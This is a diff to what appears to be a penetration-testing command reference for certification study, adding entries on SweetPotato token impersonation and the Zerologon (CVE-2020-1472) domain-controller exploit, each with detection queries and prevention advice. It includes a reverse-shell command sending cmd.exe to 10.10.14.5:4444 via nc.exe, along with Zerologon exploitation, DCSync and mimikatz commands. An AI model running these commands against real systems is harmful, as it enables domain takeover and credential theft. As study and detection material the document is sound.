+          "command": "SweetPotato.exe -e EfsRpc -p C:\\temp\\nc.exe -a \"-e cmd.exe 10.10.14.5 4444\""
+        },
+        {
+          "label": "Try PrintSpoofer technique",
+          "command": "SweetPotato.exe -e PrintSpoofer -p cmd.exe -a \"/c whoami\""
+        }
+      ],
+      "references": [
+        {
+          "title": "SweetPotato",
+          "url": "https://github.com/CCob/SweetPotato"
+        },
+        {
+          "title": "MITRE T1134.001",
+          "url": "https://attack.mitre.org/techniques/T1134/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "privesc-godpotato",
+          "note": "GodPotato is newer and more reliable on modern Windows.",
+          "rel": "alternative"
+        },
+        {
+          "id": "seimpersonate-printspoofer",
+          "note": "Standalone PrintSpoofer technique.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Combines EfsPotato, PrintSpoofer, and JuicyPotato techniques to abuse SeImpersonatePrivilege via DCOM/named pipes/RPC coercion to impersonate SYSTEM tokens.",
+        "prerequisites": "Service account with SeImpersonatePrivilege; SweetPotato binary on target.",
+        "impact": "SYSTEM-level code execution from a service account.",
+        "detection": "[MITRE T1134.001] SweetPotato process creation; token impersonation; SYSTEM child process from service account.",
+        "artifacts": "SweetPotato.exe on disk; process tree showing service-to-SYSTEM escalation; named pipe creation.",
+        "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*SweetPotato*\" OR CommandLine=\"*SweetPotato*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.name:*SweetPotato* OR process.args:*SweetPotato*",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName has \"SweetPotato\" or ProcessCommandLine has \"SweetPotato\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_process_creation_sweetpotato_privesc",
+        "prevention": "Remove SeImpersonatePrivilege from service accounts; use gMSA; EDR signatures for potato tools.",
+        "sources": [
+          "CCob research",
+          "https://attack.mitre.org/techniques/T1134/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SweetPotato privilege escalation",
+            "logic": "DeviceProcessEvents\n| where FileName has_any (\"SweetPotato\", \"GodPotato\", \"JuicyPotato\")\n  or ProcessCommandLine has_any (\"-e EfsRpc\", \"-e PrintSpoofer\", \"-e JuicyPotato\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1134.001"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Renamed binaries evade filename detection",
+            "tuning": "Also detect by behavior: service account spawning SYSTEM child processes"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-sysmon-install",
@@ -185579,6 +186158,108 @@ const COMMAND_DATA = {
       "explain": "Zeek-based intrusion detection using conn.log, dns.log, smb_files.log, and dce_rpc.log.\nKey techniques: beaconing detection via regular conn.log connection intervals (PowerShell Empire every 5s), DNS exfiltration via high-entropy subdomain enumeration in dns.log, TLS exfiltration via ...\n=== EXAMPLE 1: BEACONING DETECTION (PowerShell Empire) ===\nIndicator: malware beaconing = periodic, regular outbound connections to C2\n\nPCAP: /home/htb-student/pcaps/psempire.pcap\nTool: /usr/local/..."
     },
     {
+      "id": "ad-zerologon",
+      "name": "Zerologon (CVE-2020-1472) - Netlogon Privilege Escalation",
+      "command": "python3 cve-2020-1472-exploit.py <dc_name> <dc_ip>",
+      "description": "Zerologon exploits a flaw in the Netlogon protocol (MS-NRPC) where the initialization vector is set to all zeros. By sending Netlogon messages with a zero IV, an attacker can authenticate as the Domain Controller machine account and set its password to empty, enabling DCSync. One of the most critical AD vulnerabilities ever discovered.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "Domain Escalation",
+      "certifications": [
+        "CPTS",
+        "CRTP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "CVE-2020-1472; Secura research",
+      "tags": [
+        "zerologon",
+        "cve-2020-1472",
+        "netlogon",
+        "ms-nrpc",
+        "domain-controller",
+        "dcsync"
+      ],
+      "mitre": [
+        "T1068",
+        "T1003.006"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CHECK IF VULNERABLE ===\n  # Using crackmapexec:\n  crackmapexec smb <dc_ip> -u \"\" -p \"\" -M zerologon\n  # Using the check script:\n  python3 zerologon_tester.py <dc_name> <dc_ip>\n\n=== EXPLOIT ===\n  # Step 1: Set DC password to empty\n  python3 cve-2020-1472-exploit.py <dc_name> <dc_ip>\n\n  # Step 2: DCSync with empty password\n  secretsdump.py -no-pass -just-dc <domain>/<dc_name>$@<dc_ip>\n\n  # Step 3: RESTORE the DC password (CRITICAL!)\n  # Get the original machine account hash:\n  secretsdump.py -hashes :<admin_nthash> <domain>/Administrator@<dc_ip>\n  # Restore the password:\n  python3 restorepassword.py <domain>/<dc_name>@<dc_name> -target-ip <dc_ip> -hexpass <original_hex>\n\n=== WARNING ===\n  # ZEROLOGON BREAKS THE DC if you dont restore the password!\n  # The DC machine account password in AD will not match the\n  # local copy, causing replication failures and domain issues.\n  # ALWAYS restore the password after exploitation.\n\n=== USING MIMIKATZ ===\n  lsadump::zerologon /target:<dc_fqdn> /account:<dc_name>$ /exploit\n  lsadump::dcsync /domain:<domain> /dc:<dc_fqdn> /user:Administrator /authuser:<dc_name>$ /authdomain:<domain> /authpassword:\"\" /authntlm",
+      "examples": [
+        {
+          "label": "Check vulnerability",
+          "command": "crackmapexec smb 192.168.1.10 -u \"\" -p \"\" -M zerologon"
+        },
+        {
+          "label": "Exploit and set DC password to empty",
+          "command": "python3 cve-2020-1472-exploit.py DC01 192.168.1.10"
+        },
+        {
+          "label": "DCSync with empty password",
+          "command": "secretsdump.py -no-pass -just-dc corp.local/DC01$@192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "Secura - Zerologon Whitepaper",
+          "url": "https://www.secura.com/uploads/whitepapers/Zerologon.pdf"
+        },
+        {
+          "title": "CVE-2020-1472",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-1472"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-certifried",
+          "note": "Certifried is another critical AD CVE for domain escalation.",
+          "rel": "alternative"
+        },
+        {
+          "id": "secretsdump-ntds",
+          "note": "DCSync after Zerologon to dump all domain hashes.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The Netlogon protocol uses AES-CFB8 with a zero IV, allowing an attacker to guess the session key by sending authentication attempts with all-zero client credentials. After ~256 attempts, one will succeed.",
+        "prerequisites": "Network access to DC (port 135/445); unpatched DC (pre-August 2020 KB4571702).",
+        "impact": "Complete domain compromise; DCSync as the DC machine account; can break DC if not restored.",
+        "detection": "[MITRE T1068] Multiple failed Netlogon authentication attempts followed by success; DC machine account password change; DCSync activity.",
+        "artifacts": "Event 4742 (DC computer account changed); Event 5805 (Netlogon auth failure); massive Netlogon traffic.",
+        "splunk_spl": "index=windows (EventCode=5805 OR (EventCode=4742 AND TargetUserName=\"*$\" AND SubjectUserName=\"ANONYMOUS LOGON\"))\n| table _time, EventCode, TargetUserName, SubjectUserName",
+        "elastic_kql": "event.code:\"5805\" OR (event.code:\"4742\" AND user.name:ANONYMOUS*)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5805 or (EventID == 4742 and SubjectUserName == \"ANONYMOUS LOGON\")\n| project TimeGenerated, EventID, TargetUserName, SubjectUserName, IpAddress",
+        "sigma_rules": "win_security_zerologon_cve_2020_1472",
+        "prevention": "Apply KB4571702 (August 2020); enable Netlogon secure channel enforcement; monitor for Zerologon scanning.",
+        "sources": [
+          "CVE-2020-1472",
+          "https://attack.mitre.org/techniques/T1068/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Zerologon (CVE-2020-1472) exploitation attempt",
+            "logic": "SecurityEvent\n| where EventID == 5805\n| summarize FailCount=count() by SourceIP=IpAddress, TargetUserName, bin(TimeGenerated, 5m)\n| where FailCount > 10\n| project TimeGenerated, SourceIP, TargetUserName, FailCount",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5805"
+            ],
+            "attack": [
+              "T1068",
+              "T1003.006"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate Netlogon issues (very rare at this volume)",
+            "tuning": "Any burst of 5805 events (>10 in 5 minutes) from a single source should trigger critical alert"
+          }
+        ]
+      }
+    },
+    {
       "id": "crack-zip2john",
       "name": "zip2john / rar2john / pdf2john - Protected Archive Hash Extraction",
       "command": "zip2john protected.zip > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
@@ -185684,8 +186365,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1034,
-  "buildDate": "2026-11-10T14:01:07.320Z",
+  "totalCommands": 1041,
+  "buildDate": "2026-11-10T14:07:44.663Z",
   "certifications": [
     "CDSA",
     "CPTS",
